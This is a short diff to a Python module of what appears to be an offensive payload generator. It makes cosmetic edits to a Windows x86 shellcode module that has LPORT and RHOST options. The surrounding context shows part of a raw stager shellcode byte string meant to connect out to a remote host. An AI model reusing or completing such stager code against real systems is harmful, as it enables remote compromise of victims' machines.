@@ -17,7 +17,7 @@ class ShellcodeModule:
         self.platform = "Windows"
         self.arch = "x86"
         self.port_offset = 197
-        self.customized_shellcode = ''
+        self.customized_shellcode = ""
         self.stager = (
             b"\xFC\xE8\x86\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
             b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
@@ -41,7 +41,7 @@ class ShellcodeModule:
         self.required_options = {
             "LPORT": ["", "LPORT value"],
             "Encoder": ["None", "Optional: Encoder to use when avoiding bad characters"],
-            "BadChars": ["X", "Optional: Bad characters to avoid"],
+            "BadChars": ["\\x00", "Optional: Bad characters to avoid"],
             "RHOST": ["", "RHOST value"]
         }
 
@@ -97,8 +97,8 @@ class ShellcodeModule:
         return
 
     def payload_stats(self):
-        print("Payload Name: " + helpers.color(self.name))
-        print("Port: " + helpers.color(str(self.required_options['LPORT'][0])))
-        print("Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
+        print(" [*] Payload Name: " + helpers.color(self.name))
+        print(" [*] Port: " + helpers.color(str(self.required_options['LPORT'][0])))
+        print(" [*] Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
         print(self.customized_shellcode)
         return
